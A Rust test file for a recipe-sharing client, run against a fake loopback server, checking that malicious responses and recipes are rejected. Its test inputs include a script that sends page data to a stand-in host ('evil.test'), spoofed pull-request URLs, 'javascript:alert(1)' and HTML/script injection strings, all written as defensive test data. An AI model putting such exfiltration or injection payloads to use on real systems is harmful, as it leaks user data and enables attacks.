//! The sharing client against a canned server on a loopback port: no real network, no GitHub.

use std::{
    collections::BTreeMap,
    io::{Read, Write},
    net::TcpListener,
    sync::{
        Arc, Mutex,
        atomic::{AtomicBool, Ordering},
    },
    thread::JoinHandle,
    time::Duration,
};

use super::*;

const SHARE_ID: &str = "abcdefghijklmnopqrstuv";
const POLL_TOKEN: &str = "0123456789012345678901234567890123456789012";
const PR: &str = "https://github.com/skepjandi/openmedia/pull/42";

type Hits = Arc<Mutex<Vec<String>>>;

struct Server {
    port: u16,
    hits: Hits,
    stop: Arc<AtomicBool>,
    thread: Option<JoinHandle<()>>,
}

impl Server {
    /// `routes` maps `"GET /v1/x"` to `(status, body)`; anything else is a 404.
    fn start(routes: BTreeMap<String, (u16, String)>) -> Self {
        Self::start_with(|_| routes)
    }

    /// The routes may depend on the port the server got.
    fn start_with(routes: impl FnOnce(u16) -> BTreeMap<String, (u16, String)>) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        let port = listener.local_addr().unwrap().port();
        let routes: BTreeMap<String, (u16, String)> = routes(port)
            .into_iter()
            .map(|(key, answer)| (key.to_ascii_lowercase(), answer))
            .collect();
        let hits: Hits = Arc::default();
        let stop = Arc::new(AtomicBool::new(false));
        let (seen, stopped) = (hits.clone(), stop.clone());
        let thread = std::thread::spawn(move || {
            while !stopped.load(Ordering::SeqCst) {
                let Ok((mut stream, _)) = listener.accept() else {
                    std::thread::sleep(Duration::from_millis(2));
                    continue;
                };
                stream.set_nonblocking(false).unwrap();
                stream
                    .set_read_timeout(Some(Duration::from_secs(5)))
                    .unwrap();
                let request = read_request(&mut stream);
                let line = request.lines().next().unwrap_or_default();
                let key = line.split(' ').take(2).collect::<Vec<_>>().join(" ");
                seen.lock().unwrap().push(request.clone());
                let (status, body) = routes.get(&key).cloned().unwrap_or((404, String::new()));
                let head = format!(
                    "HTTP/1.1 {status} X\r\ncontent-length: {}\r\nconnection: close\r\n\r\n",
                    body.len()
                );
                let _ = stream.write_all(head.as_bytes());
                let _ = stream.write_all(body.as_bytes());
            }
        });
        Self {
            port,
            hits,
            stop,
            thread: Some(thread),
        }
    }

    fn url(&self) -> String {
        format!("http://127.0.0.1:{}", self.port)
    }

    fn hits(&self) -> Vec<String> {
        self.hits.lock().unwrap().clone()
    }

    fn shares(&self) -> Shares {
        Shares::new(Some(Worker::new(&self.url()).unwrap()))
    }
}

impl Drop for Server {
    fn drop(&mut self) {
        self.stop.store(true, Ordering::SeqCst);
        if let Some(thread) = self.thread.take() {
            let _ = thread.join();
        }
    }
}

fn read_request(stream: &mut std::net::TcpStream) -> String {
    let mut received = Vec::new();
    let mut chunk = [0_u8; 4096];
    loop {
        let read = stream.read(&mut chunk).unwrap_or(0);
        received.extend_from_slice(&chunk[..read]);
        let text = String::from_utf8_lossy(&received).into_owned();
        if let Some((head, rest)) = text.split_once("\r\n\r\n") {
            let wanted = head
                .lines()
                .find_map(|line| {
                    line.to_ascii_lowercase()
                        .strip_prefix("content-length:")
                        .and_then(|n| n.trim().parse::<usize>().ok())
                })
                .unwrap_or(0);
            if rest.len() >= wanted {
                return format!("{}\r\n\r\n{rest}", head.to_ascii_lowercase());
            }
        }
        if read == 0 {
            return text;
        }
    }
}

fn run<F: std::future::Future>(future: F) -> F::Output {
    tauri::async_runtime::block_on(future)
}

fn created(port: u16) -> String {
    format!(
        r#"{{"id":"{SHARE_ID}","pollToken":"{POLL_TOKEN}","loginUrl":"http://127.0.0.1:{port}/v1/shares/{SHARE_ID}/login","expiresAt":1}}"#
    )
}

fn routes(entries: &[(&str, u16, String)]) -> BTreeMap<String, (u16, String)> {
    entries
        .iter()
        .map(|(key, status, body)| ((*key).to_owned(), (*status, body.clone())))
        .collect()
}

fn recipes_with(text: &str) -> (tempfile::TempDir, Recipes) {
    let dir = tempfile::tempdir().unwrap();
    let recipes = Recipes::load(dir.path().join("recipes")).unwrap();
    recipes.save_made(&Recipe::parse(text).unwrap()).unwrap();
    (dir, recipes)
}

fn custom(script: &str) -> String {
    let script = if script.is_empty() {
        String::new()
    } else {
        format!(
            r#",{{"id":"s","label":"Tidy","type":"script","code":{}}}"#,
            serde_json::to_string(script).unwrap()
        )
    };
    format!(
        r#"{{"schema":1,"id":"custom.calm","name":"Calm YouTube!","version":"1.0.0","origin":"ai",
        "tags":["mobile"],"match":["https://*.example.com/*"],
        "options":[{{"id":"o","label":"Hide the shelf.","description":"d","group":"content","default":false}}],
        "rules":[{{"id":"r","label":"l","type":"hide","target":{{"css":".x"}},"option":"o"}}{script}],
        "meta":{{"author":"Ada","last_verified":"x"}}}}"#
    )
    .replace(r#","last_verified":"x""#, "")
}

/// A server that has no route at all, for the cases where nothing may be sent.
fn silent() -> Server {
    Server::start(BTreeMap::new())
}

fn start_share(shares: &Shares, recipes: &Recipes, summary: &str) -> (Result<String>, Vec<String>) {
    let opened = Mutex::new(Vec::new());
    let result = run(start(shares, recipes, "custom.calm", summary, |url| {
        opened.lock().unwrap().push(url.to_owned());
        Ok(())
    }));
    (result, opened.into_inner().unwrap())
}

#[test]
fn a_share_sends_the_recipe_opens_the_sign_in_and_returns_only_the_id() {
    let server = Server::start_with(|port| routes(&[("POST /v1/shares", 201, created(port))]));
    let (_dir, recipes) = recipes_with(&custom(""));
    let shares = server.shares();
    let (result, opened) = start_share(&shares, &recipes, "Hides the shelf.");
    assert_eq!(result.unwrap(), SHARE_ID);
    assert_eq!(
        opened,
        [format!("{}/v1/shares/{SHARE_ID}/login", server.url())]
    );
    let hits = server.hits();
    assert_eq!(hits.len(), 1);
    let request = &hits[0];
    assert!(request.starts_with("post /v1/shares "));
    let body: serde_json::Value =
        serde_json::from_str(request.split_once("\r\n\r\n").unwrap().1).unwrap();
    let id = body["recipe"]["id"].as_str().unwrap();
    assert!(id.starts_with("market.calm-youtube-"), "{id}");
    assert_eq!(id.len(), "market.calm-youtube-".len() + 4);
    assert_eq!(body["recipe"]["origin"], "imported");
    assert_eq!(body["recipe"]["meta"]["author"], "Ada");
    assert_eq!(body["summary"], "Hides the shelf.");
    assert!(!request.contains(POLL_TOKEN));
}

#[test]
fn a_status_follows_the_share_and_keeps_only_a_real_pull_request_address() {
    let done = format!(
        r#"{{"state":"done","prUrl":"{PR}","login":"ada-l","error":null,"errorCode":null}}"#
    );
    let server = Server::start(routes(&[(
        &format!("GET /v1/shares/{SHARE_ID}"),
        200,
        done,
    )]));
    let shares = server.shares();
    shares.insert(SHARE_ID.into(), POLL_TOKEN.into());
    let seen = run(status(&shares, SHARE_ID)).unwrap();
    assert_eq!(seen.state, ShareState::Done);
    assert_eq!(seen.pr_url.as_deref(), Some(PR));
    assert_eq!(seen.login.as_deref(), Some("ada-l"));
    assert_eq!(seen.error, None);
    assert!(server.hits()[0].contains(&format!("x-poll-token: {POLL_TOKEN}")));

    let opened = Mutex::new(Vec::new());
    open_pull_request(&shares, SHARE_ID, |url| {
        opened.lock().unwrap().push(url.to_owned());
        Ok(())
    })
    .unwrap();
    assert_eq!(opened.into_inner().unwrap(), [PR]);

    shares.cancel(SHARE_ID);
    let gone = run(status(&shares, SHARE_ID)).unwrap();
    assert_eq!(gone.state, ShareState::Failed);
    assert!(open_pull_request(&shares, SHARE_ID, |_| Ok(())).is_err());
}

#[test]
fn a_malicious_pull_request_address_or_login_is_dropped_and_never_opened() {
    for pr in [
        "https://evil.test/skepjandi/openmedia/pull/42",
        "https://github.com.evil.test/a/b/pull/1",
        "http://github.com/a/b/pull/1",
        "https://github.com/a/b/pull/1?x=1",
        "https://github.com/a/b/pull/1#frag",
        "https://github.com/a/b/issues/1",
        "https://github.com/a/b/pull/x",
        "https://user@github.com/a/b/pull/1",
        "javascript:alert(1)",
        "https://github.com/a/b/pull/1/files",
    ] {
        let body = format!(
            r#"{{"state":"done","prUrl":"{pr}","login":"<b>x</b>","error":"<script>","errorCode":null}}"#
        );
        let server = Server::start(routes(&[(
            &format!("GET /v1/shares/{SHARE_ID}"),
            200,
            body,
        )]));
        let shares = server.shares();
        shares.insert(SHARE_ID.into(), POLL_TOKEN.into());
        let seen = run(status(&shares, SHARE_ID)).unwrap();
        assert_eq!(seen.pr_url, None, "{pr}");
        assert_eq!(seen.login, None);
        assert_eq!(seen.error, None);
        assert!(
            open_pull_request(&shares, SHARE_ID, |_| Ok(())).is_err(),
            "{pr}"
        );
    }
}

#[test]
fn a_failed_share_shows_a_sentence_written_here_with_a_stable_code() {
    for (code, expected, sentence) in [
        ("tooNew", ErrorCode::TooNew, messages::TOO_NEW),
        ("limit", ErrorCode::Limit, messages::LIMIT),
        ("invalid", ErrorCode::Invalid, messages::INVALID),
        ("cancelled", ErrorCode::Cancelled, messages::CANCELLED),
        ("something-else", ErrorCode::Failed, messages::FAILED),
    ] {
        let body = format!(
            r#"{{"state":"failed","prUrl":null,"login":null,"error":"<script>alert(1)</script>","errorCode":"{code}"}}"#
        );
        let server = Server::start(routes(&[(
            &format!("GET /v1/shares/{SHARE_ID}"),
            200,
            body,
        )]));
        let shares = server.shares();
        shares.insert(SHARE_ID.into(), POLL_TOKEN.into());
        let seen = run(status(&shares, SHARE_ID)).unwrap();
        assert_eq!(seen.state, ShareState::Failed);
        assert_eq!(seen.error_code, Some(expected));
        assert_eq!(seen.error.as_deref(), Some(sentence));
    }
}

#[test]
fn an_unknown_state_or_a_gone_share_is_not_trusted() {
    let odd = r#"{"state":"hacked"}"#.to_owned();
    let server = Server::start(routes(&[(&format!("GET /v1/shares/{SHARE_ID}"), 200, odd)]));
    let shares = server.shares();
    shares.insert(SHARE_ID.into(), POLL_TOKEN.into());
    assert!(run(status(&shares, SHARE_ID)).is_err());

    let server = Server::start(routes(&[(
        &format!("GET /v1/shares/{SHARE_ID}"),
        404,
        String::new(),
    )]));
    let shares = server.shares();
    shares.insert(SHARE_ID.into(), POLL_TOKEN.into());
    let gone = run(status(&shares, SHARE_ID)).unwrap();
    assert_eq!(gone.error.as_deref(), Some(messages::EXPIRED));

    let unknown = run(status(&shares, "zzzzzzzzzzzzzzzzzzzzzz")).unwrap();
    assert_eq!(unknown.state, ShareState::Failed);
}

#[test]
fn a_recipe_that_breaks_the_script_policy_is_refused_before_anything_is_sent() {
    let server = silent();
    let (_dir, recipes) = recipes_with(&custom("fetch('https://evil.test/?c=' + document.title);"));
    let (result, opened) = start_share(&server.shares(), &recipes, "Tidy");
    let Err(Error::Share(text)) = result else {
        panic!("expected a refusal");
    };
    assert!(
        text.starts_with("This recipe uses something that cannot be shared yet:"),
        "{text}"
    );
    assert!(text.contains("network"), "{text}");
    assert!(opened.is_empty());
    assert!(server.hits().is_empty());
}

#[test]
fn only_the_users_own_recipes_with_a_summary_that_fits_are_sent() {
    let server = silent();
    let (_dir, recipes) = recipes_with(&custom(""));
    let shares = server.shares();
    let (result, _) = run_for(&shares, &recipes, "market.official.youtube", "x");
    assert!(matches!(result, Err(Error::Share(text)) if text == messages::NOT_YOURS));
    let (result, _) = run_for(&shares, &recipes, "custom.missing", "x");
    assert!(result.is_err());
    let (result, _) = run_for(&shares, &recipes, "custom.calm", &"s".repeat(141));
    assert!(matches!(result, Err(Error::Share(text)) if text == messages::NEEDS_SUMMARY));
    let (result, _) = run_for(&shares, &recipes, "custom.calm", "bad\u{202E}text");
    assert!(result.is_err());
    assert!(server.hits().is_empty());
}

fn run_for(shares: &Shares, recipes: &Recipes, id: &str, summary: &str) -> (Result<String>, ()) {
    (run(start(shares, recipes, id, summary, |_| Ok(()))), ())
}

#[test]
fn a_blank_summary_becomes_the_one_line_made_from_the_options() {
    let (_dir, recipes) = recipes_with(&custom(""));
    let recipe = recipes.get("custom.calm").unwrap();
    assert_eq!(default_summary(&recipe), "Hides shelf");
    let body = request_body(&recipes, "custom.calm", "  ").unwrap();
    let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
    assert_eq!(value["summary"], "Hides shelf");
}

#[test]
fn the_service_saying_no_becomes_a_sentence_written_here() {
    for (status, sentence) in [
        (400, messages::REFUSED),
        (429, messages::BUSY),
        (500, messages::UNAVAILABLE),
        (503, messages::UNAVAILABLE),
    ] {
        let server = Server::start(routes(&[(
            "POST /v1/shares",
            status,
            r#"{"error":"SECRET-DETAIL <b>x</b>"}"#.to_owned(),
        )]));
        let (_dir, recipes) = recipes_with(&custom(""));
        let (result, opened) = start_share(&server.shares(), &recipes, "Tidy");
        let Err(Error::Share(text)) = result else {
            panic!("expected an error for {status}");
        };
        assert_eq!(text, sentence, "{status}");
        assert!(!text.contains("SECRET"));
        assert!(opened.is_empty());
    }
}

#[test]
fn an_unreachable_service_says_to_check_the_connection() {
    let port = {
        let probe = silent();
        probe.port
    };
    let shares = Shares::new(Some(
        Worker::new(&format!("http://127.0.0.1:{port}")).unwrap(),
    ));
    let (_dir, recipes) = recipes_with(&custom(""));
    let (result, _) = start_share(&shares, &recipes, "Tidy");
    assert!(matches!(result, Err(Error::Share(text)) if text == messages::OFFLINE));
}

#[test]
fn a_sign_in_address_on_another_origin_is_never_opened() {
    let body = format!(
        r#"{{"id":"{SHARE_ID}","pollToken":"{POLL_TOKEN}","loginUrl":"https://evil.test/login"}}"#
    );
    let server = Server::start(routes(&[("POST /v1/shares", 201, body)]));
    let (_dir, recipes) = recipes_with(&custom(""));
    let shares = server.shares();
    let (result, opened) = start_share(&shares, &recipes, "Tidy");
    assert!(result.is_err());
    assert!(opened.is_empty());
    assert!(shares.sessions().is_empty());
}

#[test]
fn a_share_without_a_service_in_the_build_is_unavailable() {
    let shares = Shares::new(None);
    assert!(!shares.available());
    let (_dir, recipes) = recipes_with(&custom(""));
    let (result, _) = start_share(&shares, &recipes, "Tidy");
    assert!(matches!(result, Err(Error::Share(text)) if text == messages::UNAVAILABLE));
}

#[test]
fn a_browser_that_will_not_open_drops_the_share() {
    let server = Server::start_with(|port| routes(&[("POST /v1/shares", 201, created(port))]));
    let (_dir, recipes) = recipes_with(&custom(""));
    let shares = server.shares();
    let result = run(start(&shares, &recipes, "custom.calm", "Tidy", |_| {
        Err(Error::Share("x".into()))
    }));
    assert!(matches!(result, Err(Error::Share(text)) if text == messages::BROWSER));
    assert!(shares.sessions().is_empty());
}

#[test]
fn sessions_expire_and_are_bounded() {
    let shares = Shares::new(None);
    for n in 0..MAX_SESSIONS + 3 {
        shares.insert(format!("id{n}"), POLL_TOKEN.into());
    }
    assert_eq!(shares.sessions().len(), MAX_SESSIONS);
    assert!(
        shares
            .sessions()
            .contains_key(&format!("id{}", MAX_SESSIONS + 2))
    );
    shares
        .sessions
        .lock()
        .unwrap()
        .values_mut()
        .for_each(|session| session.created -= SESSION_TTL);
    assert!(shares.sessions().is_empty());
}

#[test]
fn a_new_id_comes_from_the_name_and_four_random_characters() {
    assert_eq!(slug_for("Calm YouTube!", "ab12"), "calm-youtube-ab12");
    assert_eq!(slug_for("  --Ünï  ", "ab12"), "n-ab12");
    assert_eq!(slug_for("日本語", "ab12"), "recipe-ab12");
    assert_eq!(slug_for("Official Thing", "ab12"), "my-official-thing-ab12");
    let long = slug_for(&"word ".repeat(30), "ab12");
    assert!(long.len() <= MAX_SLUG_NAME_CHARS + 5);
    assert!(!long.contains("--"));
    let first = new_id("Calm");
    assert_ne!(first, new_id("Calm"));
    assert!(first.starts_with("market.calm-"));
    assert!(
        recipes::parse_bundled_recipe(custom("").replace("custom.calm", &first).as_bytes()).is_ok()
    );
}

#[test]
fn only_a_github_pull_request_address_has_the_right_shape() {
    assert!(is_pull_request_url(PR));
    assert!(is_pull_request_url("https://github.com/a-b/c.d_e/pull/1"));
    assert!(!is_pull_request_url(
        "https://github.com/a/b/pull/12345678901"
    ));
    assert!(!is_pull_request_url("https://github.com:444/a/b/pull/1"));
    assert!(is_login("ada-l1"));
    for bad in ["", "a b", "a_b", "<x>", &"a".repeat(40)] {
        assert!(!is_login(bad), "{bad}");
    }
}
